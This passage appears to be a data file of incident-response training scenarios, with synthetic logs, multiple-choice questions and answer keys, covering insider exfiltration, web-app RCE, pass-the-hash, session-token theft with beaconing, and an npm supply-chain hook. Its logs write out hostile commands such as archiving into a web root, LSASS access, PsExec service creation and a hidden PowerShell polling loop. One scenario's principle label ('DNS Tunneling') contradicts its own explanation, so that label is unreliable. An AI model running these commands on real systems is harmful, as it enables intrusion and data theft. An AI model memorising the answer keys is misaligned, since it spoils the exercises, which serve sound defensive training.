                "2026-05-29T08:15:32Z - IP: 192.168.10.83 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1410",
                "2026-05-29T08:16:45Z - IP: 192.168.10.83 - URL: https://outlook.office.com/mapi - Action: Allowed - Category: Business/Collaboration - Bytes: 9200",
                "2026-05-29T09:12:00Z - IP: 192.168.10.10 - URL: https://company.sharepoint.com/sites/Marketing/Upload - Action: Allowed - Category: Cloud Storage - Bytes: 45000000",
                "2026-05-29T09:20:00Z - IP: 192.168.10.14 - URL: https://github.com/company-org/repo - Action: Allowed - Category: IT/Development - Bytes: 15300",
                "2026-05-29T09:41:05Z - IP: 192.168.10.83 - Proto: TCP/3389 (RDP) - Dest: 192.168.10.90 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:51:20Z - IP: 192.168.10.83 - URL: https://personalfileshare.example.com/api/upload - Action: Allowed - Category: Uncategorized/Personal Storage - Bytes: 88450000",
                "2026-05-29T09:58:12Z - IP: 192.168.10.14 - URL: https://stackoverflow.com - Action: Allowed - Category: IT/Development - Bytes: 8200"
            ],
            email: [
                "2026-05-29T08:00:10Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: Daily Team Sync - Status: Delivered",
                "2026-05-29T09:30:15Z - Inbound - From: hr-notifications@company.com - To: mrogers@company.com - Subject: URGENT: Confidential Separation Agreement and Transition Plan - Status: Delivered",
                "2026-05-29T09:45:00Z - Inbound - From: alerts@bamboohr.com - To: jdoe@company.com - Subject: Timesheet Approved - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T09:35:45Z - Share Name: \\\\FILE-SRV-01\\Research - Access Request: Allowed - Source IP: 192.168.10.83 - User: COMPANY\\mrogers",
                "2026-05-29T09:36:12Z - Object Accessed: \\\\FILE-SRV-01\\Research\\Patents\\NextGen_Architecture.zip - Accesses: ReadData - Source IP: 192.168.10.83 - User: COMPANY\\mrogers",
                "2026-05-29T09:55:00Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.14 - User: COMPANY\\jdoe"
            ],
            workstations: [
                "2026-05-29T09:30:20Z - WKSTN-33 (192.168.10.83) - EventID: 4801 - Workstation Unlocked - User: COMPANY\\mrogers",
                "2026-05-29T09:30:45Z - WKSTN-33 (192.168.10.83) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url https://outlook.office.com",
                '2026-05-29T09:42:15Z - DEV-SRV-02 (192.168.10.90) - EventID: 4688 - Process Created: explorer.exe spawned C:\\Program Files\\7-Zip\\7z.exe a -t7z C:\\Windows\\Temp\\engine_backup.7z C:\\Source\\Core_Engine\\',
                "2026-05-29T09:48:30Z - WKSTN-33 (192.168.10.83) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe --new-window https://personalfileshare.example.com",
                "2026-05-29T10:00:00Z - WKSTN-33 (192.168.10.83) - EventID: 4800 - Workstation Locked - User: COMPANY\\mrogers"
            ],
            auth_logs: [
                "2026-05-29T08:05:00Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
                "2026-05-29T08:14:50Z - IdP_Auth - User: mrogers@company.com - App: Exchange Online - AuthMethod: Password+MFA - Status: Success - Agent: Microsoft Outlook for Windows",
                "2026-05-29T08:14:55Z - WKSTN-33 (192.168.10.83) - EventID: 4624 - Successful Logon - User: COMPANY\\mrogers - Logon Type: 2 (Interactive)",
                "2026-05-29T09:41:05Z - DEV-SRV-02 (192.168.10.90) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.83 - User: COMPANY\\mrogers - Logon Type: 10 (RemoteInteractive/RDP)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial trigger event and vector that prompted this incident?",
                type: "select",
                options: [
                    "A malicious drive-by download from an external IT blog",
                    "An internal HR termination notification sent to a disgruntled employee",
                    "A compromised software patch downloaded from a vendor site",
                    "An external phishing email harvesting domain admin passwords"
                ],
                correct: "An internal HR termination notification sent to a disgruntled employee"
            },
            origin: {
                label: "Which asset served as the primary system used to coordinate the collection and exfiltration of data?",
                type: "select",
                options: [
                    "WKSTN-01",
                    "WKSTN-04",
                    "DEV-SRV-02",
                    "WKSTN-33"
                ],
                correct: "WKSTN-33"
            },
            count: {
                label: "How many corporate assets (workstations/servers) were directly accessed or interacted with by the insider threat actor to stage data?",
                type: "number",
                correct: 3
            },
            beaconing: {
                label: "What network channel and destination were leveraged by the threat actor to exfiltrate the stolen assets?",
                type: "select",
                options: [
                    "An encrypted DNS TXT tunnel to cdn-cache-update.top",
                    "Oversized ICMP echo requests sent directly to 203.0.113.84",
                    "An overt HTTPS upload session to personalfileshare.example.com",
                    "An outbound SSH transfer to a rogue server over TCP 22"
                ],
                correct: "An overt HTTPS upload session to personalfileshare.example.com"
            },
            lateral_movement: {
                label: "Which protocol was utilized to move laterally from the primary workstation to the secondary production server?",
                type: "select",
                options: [
                    "Server Message Block (SMB) file transfer",
                    "Remote Desktop Protocol (RDP) over TCP 3389",
                    "Windows Management Instrumentation (WMI) over TCP 135",
                    "SSH console connection over TCP 22"
                ],
                correct: "Remote Desktop Protocol (RDP) over TCP 3389"
            }
        },
        principles: ["Insider Threat", "Data Exfiltration (Overt Channel)", "Lateral Movement", "Unauthorized Privilege Use"],
        explanation: "At 09:30:15Z, user 'mrogers' received a legitimate termination notice from HR. Shortly after, at 09:35:45Z, he accessed FILE-SRV-01 using standard SMB protocols to copy next-gen patent designs. Seeking source code, he laterally connected via RDP (TCP 3389) to the development server DEV-SRV-02 at 09:41:05Z, where he ran a command-line 7z.exe archive script to compress proprietary local code repositories. Returning the code package to his workstation, mrogers exfiltrated the accumulated data at 09:51:20Z via an overt HTTPS file upload to personalfileshare.example.com, generating a massive 85MB data spike. While benign marketing users also uploaded large files to SharePoint, that traffic was directed to safe corporate infrastructure, making the unclassified personal cloud server the key differentiator in this incident."
    },
    {
        id: "ir-scenario-2026-zeroday-staging",
        title: "Operation Hidden Cache",
        description: "Critical web application compromise identified via parent-child process anomalies on public web servers and unauthorized web root file staging.",
        logs: {
            proxy: [
                "2026-05-29T11:00:05Z - IP: 198.51.100.12 - URL: https://www.company.com/index.html - Action: Allowed - Category: General - Status: 200 - Bytes: 4500",
                "2026-05-29T11:02:15Z - IP: 198.51.100.77 - URL: https://www.company.com/api - Action: Allowed - Category: General - Status: 404 - Bytes: 280",
                "2026-05-29T11:02:22Z - IP: 198.51.100.77 - URL: https://www.company.com/api/v1/parser - Action: Allowed - Category: General - Status: 405 - Bytes: 310",
                "2026-05-29T11:02:35Z - IP: 198.51.100.77 - URL: https://www.company.com/api/v2/document-parser - Action: Allowed - Category: General - Status: 200 - Bytes: 1500",
                "2026-05-29T11:10:42Z - IP: 192.168.10.15 - URL: http://192.168.10.80/api/v2/document-parser - Action: Allowed - Category: Internal-Audit - Status: 200 - Bytes: 1500",
                "2026-05-29T11:15:30Z - IP: 198.51.100.77 - URL: https://www.company.com/api/v2/document-parser - Action: Allowed - Category: General - Status: 500 - Method: POST - Bytes: 42000",
                "2026-05-29T11:20:12Z - IP: 198.51.100.44 - URL: https://www.company.com/assets/css/main.css - Action: Allowed - Category: General - Status: 200 - Bytes: 12400",
                "2026-05-29T11:28:55Z - IP: 192.168.10.10 - URL: http://192.168.10.80/assets/images/marketing/hero_banner_v2.png - Action: Allowed - Category: Internal-Upload - Status: 201 - Method: POST - Bytes: 1450000",
                "2026-05-29T11:32:45Z - IP: 198.51.100.77 - URL: https://www.company.com/assets/images/.system_temp/payroll_staging.zip - Action: Allowed - Category: General - Status: 200 - Method: GET - Bytes: 85200000",
                "2026-05-29T11:40:00Z - IP: 198.51.100.12 - URL: https://www.company.com/about.html - Action: Allowed - Category: General - Status: 200 - Bytes: 5100"
            ],
            email: [
                "2026-05-29T11:00:10Z - Inbound - From: security-alerts@internal-siem.local - To: soc-team@company.com - Subject: Notice: Scheduled Subnet Scans Beginning - Status: Delivered",
                "2026-05-29T11:15:00Z - Inbound - From: portal-notifications@bamboohr.com - To: employee-all@company.com - Subject: Update: Q2 Compensation Statements Available - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T11:10:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T11:24:12Z - Local Disk Access: D:\\Corporate_Vault\\HR_Payroll_2026.csv - Accesses: ReadData - Source IP: 192.168.10.80 - User: IIS_IUSRS\\DefaultAppPool",
                "2026-05-29T11:28:50Z - Local Disk Access: C:\\inetpub\\wwwroot\\assets\\images\\.system_temp\\payroll_staging.zip - Accesses: WriteData - Source IP: 192.168.10.80 - User: IIS_IUSRS\\DefaultAppPool"
            ],
            workstations: [
                "2026-05-29T11:15:32Z - WEB-SRV-01 (192.168.10.80) - EventID: 4688 - Process Created: w3wp.exe spawned cmd.exe /c whoami",
                "2026-05-29T11:16:05Z - WEB-SRV-01 (192.168.10.80) - EventID: 4688 - Process Created: w3wp.exe spawned cmd.exe /c dir D:\\Corporate_Vault\\",
                '2026-05-29T11:24:30Z - WEB-SRV-01 (192.168.10.80) - EventID: 4688 - Process Created: cmd.exe spawned powershell.exe -Command "Compress-Archive -Path D:\\Corporate_Vault\\HR_Payroll_2026.csv -DestinationPath C:\\inetpub\\wwwroot\\assets\\images\\.system_temp\\payroll_staging.zip"',
                "2026-05-29T11:28:40Z - WEB-SRV-01 (192.168.10.80) - EventID: 4688 - Process Created: cmd.exe spawned attrib.exe +h C:\\inetpub\\wwwroot\\assets\\images\\.system_temp"
            ],
            auth_logs: [
                "2026-05-29T11:00:00Z - WEB-SRV-01 (192.168.10.80) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.15 - User: COMPANY\\scan-svc - Logon Type: 3 (Network)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial infection/compromise vector leveraged by the threat actor?",
                type: "select",
                options: [
                    "A malicious attachment inside a spoofed human resources email",
                    "An unauthenticated Remote Code Execution (RCE) zero-day exploit in a public-facing API",
                    "Stolen VPN session tokens harvested from a corporate workstation",
                    "An administrative credential stuffing attack on the file share repository"
                ],
                correct: "An unauthenticated Remote Code Execution (RCE) zero-day exploit in a public-facing API"
            },
            origin: {
                label: "Which asset served as the primary system compromised by the attacker during the intrusion?",
                type: "select",
                options: [
                    "FILE-SRV-01",
                    "WEB-SRV-01",
                    "sec-audit-01",
                    "WKSTN-01"
                ],
                correct: "WEB-SRV-01"
            },
            count: {
                label: "How many internal systems show telemetry indicating that a malicious process or shell was actively executed?",
                type: "number",
                correct: 1
            },
            staging_location: {
                label: "To which specific folder path did the attacker write the compressed sensitive files to stage them for retrieval?",
                type: "select",
                options: [
                    "D:\\Corporate_Vault\\",
                    "\\\\FILE-SRV-01\\Public\\Brand_Assets\\",
                    "C:\\Windows\\Temp\\",
                    "C:\\inetpub\\wwwroot\\assets\\images\\.system_temp\\"
                ],
                correct: "C:\\inetpub\\wwwroot\\assets\\images\\.system_temp\\"
            },
            exfiltration_method: {
                label: "How did the attacker bypass outbound egress filtering rules to exfiltrate the compressed data archive?",
                type: "select",
                options: [
                    "Sending outbound DNS TXT query chunks to a command server",
                    "Uploading the archive to a personal cloud hosting provider using high-volume POST requests",
                    "Issuing an inbound HTTP GET request to download the staged archive from the public web root",
                    "Opening an outbound SSH tunnel over Port 22 back to the external scanner"
                ],
                correct: "Issuing an inbound HTTP GET request to download the staged archive from the public web root"
            }
        },
        principles: ["DNS Tunneling / Exfiltration", "Reconnaissance / Scanning"],
        explanation: "At 11:15:30Z, an external threat actor at IP 198.51.100.77 initiated a massive 42KB HTTP POST payload targeting the /api/v2/document-parser API endpoint on WEB-SRV-01. This request triggered an unauthenticated zero-day remote code execution vulnerability, forcing the IIS web worker process (w3wp.exe) to spawn cmd.exe. Running commands as IIS_IUSRS, the attacker accessed D:\\Corporate_Vault\\HR_Payroll_2026.csv, zipped it via PowerShell, and relocated it into the public-facing directory C:\\inetpub\\wwwroot\\assets\\images\\.system_temp\\, hiding the folder using attrib.exe +h. The attacker then completed the exfiltration at 11:32:45Z via an inbound HTTP GET request directly to the staged file path, effectively bypassing outbound egress controls by using the server's legitimate incoming web traffic. Telemetry also shows noisy internal auditing traffic from sec-audit-01 scanning the web app, which is benign and matches corporate security scanning schedules."
    },
    {
        id: "ir-scenario-2026-pass-the-hash",
        title: "Operation Cached Identity",
        description: "Anomalous administrator logins using NTLM instead of Kerberos detected on critical servers, originating from standard workstations.",
        logs: {
            proxy: [
                "2026-05-29T08:02:14Z - IP: 192.168.10.10 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1450",
                "2026-05-29T08:30:10Z - IP: 192.168.10.12 - URL: https://teams.microsoft.com - Action: Allowed - Category: Business/Collaboration - Bytes: 14000",
                "2026-05-29T09:10:15Z - IP: 192.168.10.110 - URL: http://blog.uncategorized-news.com/ads/click?id=9921 - Action: Allowed - Category: Uncategorized - Bytes: 4500",
                "2026-05-29T09:10:30Z - IP: 192.168.10.110 - URL: http://blog.uncategorized-news.com/payloads/update_agent.exe - Action: Allowed - Category: Uncategorized - Bytes: 1250000",
                "2026-05-29T09:50:00Z - IP: 192.168.10.50 - URL: https://external-c2-panel.top/api/v1/heartbeat - Action: Allowed - Category: Uncategorized - Bytes: 350"
            ],
            email: [
                "2026-05-29T08:00:10Z - Inbound - From: notifications@slack.com - To: bjohnson@company.com - Subject: Weekly Channel Digest - Status: Delivered",
                "2026-05-29T09:15:00Z - Inbound - From: newsletters@techtrends.com - To: bjohnson@company.com - Subject: Daily Newsletter - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T08:32:02Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
                "2026-05-29T09:44:10Z - Share Name: \\\\MGMT-SRV-01\\ADMIN$ - Access Request: Allowed - Source IP: 192.168.10.110 - User: COMPANY\\srv-admin",
                "2026-05-29T09:44:22Z - File Created: \\\\MGMT-SRV-01\\ADMIN$\\PSEXECSVC.exe - Accesses: WriteData - Source IP: 192.168.10.110 - User: COMPANY\\srv-admin"
            ],
            workstations: [
                "2026-05-29T09:10:35Z - WKSTN-10 (192.168.10.110) - EventID: 4688 - Process Created: chrome.exe spawned C:\\Users\\bjohnson\\Downloads\\update_agent.exe",
                "2026-05-29T09:22:30Z - WKSTN-10 (192.168.10.110) - EventID: 4688 - Process Created: update_agent.exe spawned privilege_escalator.exe (SYSTEM privileges obtained)",
                "2026-05-29T09:25:00Z - WKSTN-10 (192.168.10.110) - Sysmon EventID: 10 - Process Access: privilege_escalator.exe accessed lsass.exe - TargetGrantedAccess: 0x1F0FFF",
                "2026-05-29T09:45:00Z - MGMT-SRV-01 (192.168.10.50) - EventID: 7045 - Service Created: PSEXECSVC - Service File Name: %SystemRoot%\\PSEXECSVC.exe - User Context: LocalSystem"
            ],
            auth_logs: [
                "2026-05-29T08:10:00Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\tcollins - Logon Type: 2 (Interactive)",
                "2026-05-29T08:15:30Z - IdP_Auth - User: tcollins@company.com - App: O365 Portal - AuthMethod: Password+MFA - Status: Success - Agent: Chrome Browser",
                "2026-05-29T08:15:45Z - WKSTN-10 (192.168.10.110) - EventID: 4624 - Successful Logon - User: COMPANY\\bjohnson - Logon Type: 2 (Interactive)",
                "2026-05-29T08:22:15Z - WKSTN-05 (192.168.10.15) - EventID: 4624 - Successful Logon - User: COMPANY\\helpdesk-admin - Logon Type: 3 (Network) - Auth Package: Kerberos - Key Length: 256 - Source IP: 192.168.10.14 - Note: Legitimate admin helpdesk session",
                "2026-05-29T09:42:15Z - MGMT-SRV-01 (192.168.10.50) - EventID: 4624 - Successful Logon - User: COMPANY\\srv-admin - Logon Type: 3 (Network) - Auth Package: NTLM - Key Length: 0 - Source IP: 192.168.10.110 - Workstation Name: WKSTN-10"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial infection/compromise vector leveraged to access Patient Zero?",
                type: "select",
                options: [
                    "A malicious drive-by download via a compromised/unclassified web advertisement",
                    "An unauthenticated VPN connection bypass exploiting stale user accounts",
                    "A targeted phishing email attachment disguised as an internal policy update",
                    "An open RDP administrative gateway exposed directly to the public internet"
                ],
                correct: "A malicious drive-by download via a compromised/unclassified web advertisement"
            },
            origin: {
                label: "Which asset serves as Patient Zero (Point of Origin) where credentials were first harvested?",
                type: "select",
                options: [
                    "WKSTN-03",
                    "WKSTN-05",
                    "WKSTN-10",
                    "MGMT-SRV-01"
                ],
                correct: "WKSTN-10"
            },
            lateral_movement: {
                label: "What credential abuse technique did the attacker use to pivot from the workstation to the management server?",
                type: "select",
                options: [
                    "Kerberos Golden Ticket forgery using a stolen krbtgt password hash",
                    "Plaintext password stuffing against local SSH admin consoles",
                    "Pass-the-Hash (PtH) authentication over SMB/NTLM",
                    "Session hijacking by stealing active OAuth security tokens from browser cache"
                ],
                correct: "Pass-the-Hash (PtH) authentication over SMB/NTLM"
            },
            indicator: {
                label: "Which anomalous forensic indicator in the target's security logs confirms the credential abuse technique?",
                type: "select",
                options: [
                    "Event ID 4624 with Authentication Package: Kerberos and Key Length: 256",
                    "Event ID 4624 with Logon Type 3, Authentication Package: NTLM, and Key Length: 0",
                    "Event ID 4625 (Logon Failure) with Status Code 0xC000006D",
                    "Event ID 4720 showing the creation of a new rogue administrative user account"
                ],
                correct: "Event ID 4624 with Logon Type 3, Authentication Package: NTLM, and Key Length: 0"
            },
            persistence: {
                label: "How did the attacker execute commands and establish initial persistence on the management server?",
                type: "select",
                options: [
                    "Creating a rogue administrative scheduled task running daily",
                    "Adding a persistent registry Run key inside the srv-admin user profile",
                    "Installing a temporary Windows Service via remote administrative share writes",
                    "Configuring an unauthorized IIS Web Shell in the server's public root"
                ],
                correct: "Installing a temporary Windows Service via remote administrative share writes"
            }
        },
        principles: ["Pass-the-Hash", "Lateral Movement", "Privilege Escalation", "Persistence"],
        explanation: "At 09:10:15Z, user bjohnson on WKSTN-10 downloaded 'update_agent.exe' via an unclassified ad-click web redirect. The payload executed, escalated local privileges, and dumped LSASS memory (Sysmon Event ID 10) at 09:25:00Z to harvest cached NTLM hashes. Rather than attempting to crack the hash of the srv-admin account, the attacker performed a Pass-the-Hash (PtH) network pivot targeting MGMT-SRV-01 at 09:42:15Z. Because only the hash was used, the authentication defaulted to NTLM rather than Kerberos, leaving a distinct fingerprint in the target server's Windows Event ID 4624: Logon Type 3 (Network), Authentication Package: NTLM, and a Key Length of 0. Once validated as local administrator, the attacker dropped PSEXECSVC.exe into the remote ADMIN$ share and registered a new system service to run commands. Meanwhile, benign helpdesk administrators logged into workstations using legitimate Kerberos sessions (demonstrating standard key lengths and authentication packages) to serve as background noise."
    },
    {
        id: "ir-scenario-2026-impossible-travel-social",
        title: "Operation Border Cross",
        description: "Critical alerts triggered by geographically impossible logins for a single identity alongside highly structured outbound social media telemetry.",
        logs: {
            proxy: [
                "2026-05-29T14:00:05Z - IP: 192.168.10.10 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1450",
                "2026-05-29T14:02:15Z - IP: 192.168.10.122 - URL: https://socialmedia.example.com/hub/developer-discussions - Action: Allowed - Category: Social Media - Bytes: 15400",
                "2026-05-29T14:10:20Z - IP: 192.168.10.88 - URL: https://outlook.office.com/mapi - Action: Allowed - Category: Business/Collaboration - Bytes: 8900",
                "2026-05-29T14:15:00Z - IP: 192.168.10.88 - URL: https://socialmedia.example.com/company-feed/posts?id=8831 - Action: Allowed - Category: Social Media - Bytes: 1024",
                "2026-05-29T14:16:00Z - IP: 192.168.10.88 - URL: https://socialmedia.example.com/company-feed/posts?id=8831 - Action: Allowed - Category: Social Media - Bytes: 1024",
                "2026-05-29T14:17:00Z - IP: 192.168.10.88 - URL: https://socialmedia.example.com/company-feed/posts?id=8831 - Action: Allowed - Category: Social Media - Bytes: 1024",
                "2026-05-29T14:18:00Z - IP: 192.168.10.88 - URL: https://socialmedia.example.com/company-feed/posts?id=8831 - Action: Allowed - Category: Social Media - Bytes: 1024",
                "2026-05-29T14:19:00Z - IP: 192.168.10.88 - URL: https://socialmedia.example.com/company-feed/posts?id=8831 - Action: Allowed - Category: Social Media - Bytes: 1024",
                "2026-05-29T14:20:00Z - IP: 192.168.10.88 - URL: https://socialmedia.example.com/company-feed/posts?id=8831 - Action: Allowed - Category: Social Media - Bytes: 1024",
                "2026-05-29T14:45:00Z - IP: 192.168.10.122 - URL: https://socialmedia.example.com/hub/developer-discussions - Action: Allowed - Category: Social Media - Bytes: 254100",
                "2026-05-29T15:22:10Z - IP: 192.168.10.122 - URL: https://socialmedia.example.com/hub/developer-discussions - Action: Allowed - Category: Social Media - Bytes: 45000"
            ],
            email: [
                "2026-05-29T14:05:00Z - Inbound - From: security@company-portal-auth.com - To: jdoe@company.com - Subject: Action Required: Re-authenticate Session - Status: Delivered",
                "2026-05-29T14:30:00Z - Inbound - From: external-vendor@supplies.com - To: jdoe@company.com - Subject: Order Shipped Confirmation - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T14:14:10Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.88 - User: COMPANY\\jdoe",
                "2026-05-29T14:25:30Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Onboarding\\New_Hire_Guides.pdf - Accesses: ReadData - Source IP: 192.168.10.88 - User: COMPANY\\jdoe"
            ],
            workstations: [
                "2026-05-29T14:02:15Z - WKSTN-22 (192.168.10.122) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe --new-window https://socialmedia.example.com/hub/developer-discussions",
                "2026-05-29T14:08:15Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url http://company-portal-auth.com/login",
                '2026-05-29T14:14:05Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: chrome.exe spawned powershell.exe -WindowStyle Hidden -Command "while($true) { Invoke-WebRequest -Uri \'https://socialmedia.example.com/company-feed/posts?id=8831\' -UseBasicParsing; Start-Sleep -Seconds 60 }"'
            ],
            auth_logs: [
                "2026-05-29T14:00:10Z - IdP_Auth - User: asmith@company.com - App: O365 Portal - AuthMethod: Password+MFA - Status: Success - Country: USA - IP: 104.244.42.1",
                "2026-05-29T14:02:00Z - WKSTN-22 (192.168.10.122) - EventID: 4624 - Successful Logon - User: COMPANY\\kbaker - Logon Type: 2 (Interactive)",
                "2026-05-29T14:10:00Z - WKSTN-08 (192.168.10.88) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
                "2026-05-29T14:10:15Z - IdP_Auth - User: jdoe@company.com - App: O365 Portal - AuthMethod: Password - Status: Success - Country: USA - IP: 198.51.100.12",
                "2026-05-29T14:12:45Z - IdP_Auth - User: jdoe@company.com - App: O365 Portal - AuthMethod: Session_Token - Status: Success - Country: Bulgaria - IP: 82.103.112.55"
            ]
        },
        questions: {
            vector: {
                label: "Which analytical security event confirmed the initial identity-based compromise?",
                type: "select",
                options: [
                    "A local brute force attack executing continuous Event ID 4625 failures",
                    "Geographically impossible travel logins occurring within 3 minutes between the USA and Bulgaria",
                    "A malicious attachment download logged by Microsoft Outlook on WKSTN-08",
                    "An unauthenticated VPN connection attempting to brute-force security portals"
                ],
                correct: "Geographically impossible travel logins occurring within 3 minutes between the USA and Bulgaria"
            },
            origin: {
                label: "Identify the endpoint workstation being utilized by the compromised user accounts during the internal incident phase:",
                type: "select",
                options: [
                    "WKSTN-01",
                    "WKSTN-22",
                    "WKSTN-08",
                    "FILE-SRV-01"
                ],
                correct: "WKSTN-08"
            },
            beaconing: {
                label: "What indicator distinguishes the command-and-control (C2) channel from standard user activity?",
                type: "select",
                options: [
                    "A dynamic DNS domain resolving to malicious infrastructure over UDP Port 53",
                    "Unstructured web browsing mimicking standard search engines",
                    "A highly rigid and consistent 60-second connection frequency returning identical payload sizes (1024 bytes)",
                    "Oversized ICMP echo requests transferring payload batches back to Sofia"
                ],
                correct: "A highly rigid and consistent 60-second connection frequency returning identical payload sizes (1024 bytes)"
            }
        },
        principles: ["Impossible Travel (Geo-velocity violation)", "Beaconing / Command & Control"],
        explanation: "At 14:10:15Z, user jdoe authenticated legitimately from New York, USA. Just 2 minutes and 30 seconds later, at 14:12:45Z, a second login event was authorized using jdoe's active session token from Sofia, Bulgaria. Because traveling 4,700 miles in under three minutes is physically impossible, this confirms a Session Hijack compromise. Correlating the telemetry, jdoe received a phishing email at 14:05:00Z designed to harvest OAuth tokens and drop a silent payload. After the token was successfully stolen and utilized from Bulgaria, the local payload executed on WKSTN-08 at 14:14:05Z, spawning a persistent background PowerShell process that began polling socialmedia.example.com/company-feed/posts exactly every 60 seconds. Meanwhile, developer kbaker browsed the same social media domain for technical discussions at erratic times with widely varying payload sizes, providing benign background noise."
    },
    {
        id: "ir-scenario-2026-cicd-supply-chain",
        title: "Operation Shadow Commit",
        description: "Sensitive database exfiltration occurring via an unauthorized public repository creation on corporate Git infrastructure, initiated by a compromised npm installer hook.",
        logs: {
            proxy: [
                "2026-05-29T15:00:10Z - IP: 192.168.10.122 - URL: https://registry.npmjs.org/express - Action: Allowed - Category: Software/Updates - Bytes: 14500",
                "2026-05-29T15:02:14Z - IP: 192.168.10.10 - URL: https://git.example.com/marketing/assets-2026 - Action: Allowed - Category: Code-Repository - Bytes: 124500",
                "2026-05-29T15:05:00Z - IP: 192.168.10.122 - URL: https://git.example.com/devops/base-template - Action: Allowed - Category: Code-Repository - Bytes: 45000",
                "2026-05-29T15:12:02Z - IP: 192.168.10.88 - URL: https://registry.npmjs.org/utility-math-helper - Action: Allowed - Category: Software/Updates - Bytes: 8900",
                "2026-05-29T15:24:30Z - IP: 192.168.10.88 - URL: https://git.example.com/api/v4/projects - Action: Allowed - Method: POST - Category: Code-Repository - Bytes: 1200",
                "2026-05-29T15:25:12Z - IP: 192.168.10.88 - URL: https://git.example.com/public-mirrors/temp-patch/info/refs - Action: Allowed - Method: POST - Category: Code-Repository - Bytes: 78500000",
                "2026-05-29T15:28:00Z - IP: 198.51.100.99 - URL: https://git.example.com/public-mirrors/temp-patch/raw/main/financial_export_2026.db - Action: Allowed - Method: GET - Category: Code-Repository - Bytes: 78500000",
                "2026-05-29T15:35:10Z - IP: 192.168.10.14 - URL: https://stackoverflow.com - Action: Allowed - Category: IT/Development - Bytes: 8400"
            ],
            email: [
                "2026-05-29T15:00:15Z - Inbound - From: notifications@slack.com - To: jdoe@example.com - Subject: You have 3 unread messages - Status: Delivered",
                "2026-05-29T15:24:35Z - Inbound - From: git-security@git.example.com - To: git-admins@example.com - Subject: Notice: New Public Repository Created (public-mirrors/temp-patch) - Status: Delivered",
                "2026-05-29T15:30:00Z - Inbound - From: alerts@bamboohr.com - To: kbaker@example.com - Subject: Policy Update Acknowledged - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T15:01:05Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T15:15:22Z - Local Disk Access: D:\\Staging\\financial_export_2026.db - Accesses: ReadData - Source IP: 192.168.10.88 - User: COMPANY\\jdoe",
                "2026-05-29T15:32:10Z - Share Name: \\\\FILE-SRV-01\\DevShare - Access Request: Allowed - Source IP: 192.168.10.122 - User: COMPANY\\kbaker"
            ],
            workstations: [
                "2026-05-29T15:04:15Z - WKSTN-22 (192.168.10.122) - EventID: 4688 - Process Created: cmd.exe spawned node.exe install",
                "2026-05-29T15:10:15Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: explorer.exe spawned vscode.exe",
                "2026-05-29T15:12:00Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: vscode.exe spawned node.exe install",
                '2026-05-29T15:12:05Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: node.exe spawned cmd.exe /c "node -e \\"require(\'child_process\').exec(\'git init && git config ...\')\\\""',
                "2026-05-29T15:15:10Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: cmd.exe spawned git.exe init D:\\Staging\\",
                "2026-05-29T15:24:28Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: cmd.exe spawned git.exe remote add origin https://git.example.com/public-mirrors/temp-patch.git",
                "2026-05-29T15:25:00Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: cmd.exe spawned git.exe push -u origin main"
            ],
            auth_logs: [
                "2026-05-29T15:00:00Z - WKSTN-22 (192.168.10.122) - EventID: 4624 - Successful Logon - User: COMPANY\\kbaker - Logon Type: 2 (Interactive)",
                "2026-05-29T15:08:30Z - WKSTN-08 (192.168.10.88) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial mechanism (attack vector) used to compromise Patient Zero?",
                type: "select",
                options: [
                    "A malicious attachments inside a targeted spear-phishing email",
                    "A drive-by browser vulnerability executing code via malicious advertisements",
                    "A compromised third-party software library dependency installer hook (Supply Chain)",
                    "Stolen local administrator RDP credentials harvested via public leaks"
                ],
                correct: "A compromised third-party software library dependency installer hook (Supply Chain)"
            },
            origin: {
                label: "Which internal system served as Patient Zero where the malicious installer script executed?",
                type: "select",
                options: [
                    "WKSTN-22",
                    "WKSTN-08",
                    "WKSTN-01",
                    "FILE-SRV-01"
                ],
                correct: "WKSTN-08"
            },
            anomaly: {
